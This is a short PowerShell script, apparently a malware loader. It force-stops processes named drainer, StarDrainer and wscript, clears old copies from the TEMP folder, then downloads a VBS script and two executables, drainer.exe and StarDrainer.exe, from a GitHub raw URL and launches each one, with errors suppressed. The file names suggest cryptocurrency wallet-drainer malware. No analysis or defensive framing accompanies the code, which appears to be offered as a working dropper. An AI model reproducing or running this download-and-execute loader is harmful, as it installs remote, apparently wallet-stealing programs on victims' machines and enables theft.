$base = 'https://github.com/jesuss13377-source/123/raw/refs/heads/main/'
$vbs = "$env:TEMP\script.vbs"
$d1  = "$env:TEMP\drainer.exe"
$d2  = "$env:TEMP\StarDrainer.exe"

Stop-Process -Name drainer -Force -ErrorAction SilentlyContinue
Stop-Process -Name StarDrainer -Force -ErrorAction SilentlyContinue
Stop-Process -Name wscript -Force -ErrorAction SilentlyContinue

Remove-Item $vbs -Force -ErrorAction SilentlyContinue
Remove-Item $d1  -Force -ErrorAction SilentlyContinue
Remove-Item $d2  -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

Invoke-WebRequest -Uri ($base + 'script.vbs') -OutFile $vbs -UseBasicParsing
Invoke-WebRequest -Uri ($base + 'drainer.exe') -OutFile $d1 -UseBasicParsing
Invoke-WebRequest -Uri ($base + 'StarDrainer.exe') -OutFile $d2 -UseBasicParsing

if (Test-Path $vbs) { Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" }
if (Test-Path $d1)  { Start-Process -FilePath $d1 }
if (Test-Path $d2)  { Start-Process -FilePath $d2 }
